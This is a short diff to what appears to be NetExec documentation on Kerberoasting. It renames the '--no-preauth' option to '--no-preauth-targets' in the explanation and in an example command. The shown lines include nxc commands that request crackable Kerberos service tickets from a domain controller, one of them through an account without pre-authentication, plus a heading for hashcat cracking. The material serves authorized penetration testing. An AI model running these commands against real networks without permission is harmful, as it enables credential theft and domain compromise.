@@ -17,14 +17,14 @@ nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
 ```
 # Kerberoasting via AS-REP Roasting
 
-> You can also perform Kerberoasting by leveraging an AS-REP roastable account that does not require pre-authentication. This is possible by combining `--no-preauth` and `--kerberoasting`.
+> You can also perform Kerberoasting by leveraging an AS-REP roastable account that does not require pre-authentication. This is possible by combining `--no-preauth-targets` and `--kerberoasting`.
 
 ```bash
-nxc ldap 192.168.0.104 -u harry -p '' --no-preauth kerberoastable.list --kerberoasting output.txt
+nxc ldap 192.168.0.104 -u harry -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
 ```
 
 * `-u`: AS-REP roastable user (no pre-auth required).
-* `--no-preauth`: Single user or file containing list of users to target with Kerberoasting.
+* `--no-preauth-targets`: Single user or file containing list of users to target with Kerberoasting.
 
 ### Cracking with hashcat
 
